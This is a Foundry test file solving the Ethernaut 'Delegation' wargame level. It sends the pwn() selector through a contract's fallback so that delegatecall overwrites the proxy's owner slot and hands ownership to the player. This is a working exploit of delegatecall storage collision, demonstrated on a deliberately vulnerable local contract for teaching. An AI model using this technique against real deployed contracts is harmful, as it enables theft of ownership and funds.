// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/06_Delegation.sol";

/// @title Ethernaut 06 - Delegation Solution Test
/// @notice Verifies that delegated pwn() code overwrites the proxy's owner slot.
contract DelegationTest is Test {
    /// @notice Delegate implementation used by the target.
    Delegate delegate;

    /// @notice Delegation instance whose ownership must be claimed.
    Delegation delegation;

    /// @notice Account used to solve the level.
    address player = makeAddr("player");

    /// @notice Initial owner assigned to the implementation contract.
    address initialDelegateOwner = makeAddr("initialDelegateOwner");

    /// @notice Deploys an implementation and a fresh Delegation target.
    function setUp() public {
        delegate = new Delegate(initialDelegateOwner);
        delegation = new Delegation(address(delegate));
    }

    /// @notice Sends the pwn() selector through fallback and verifies the proxy storage change.
    function testSolve() public {
        assertNotEq(delegation.owner(), player);

        vm.prank(player);
        (bool success,) = address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));

        assertTrue(success);
        assertEq(delegation.owner(), player);
        assertEq(delegate.owner(), initialDelegateOwner);
    }
}
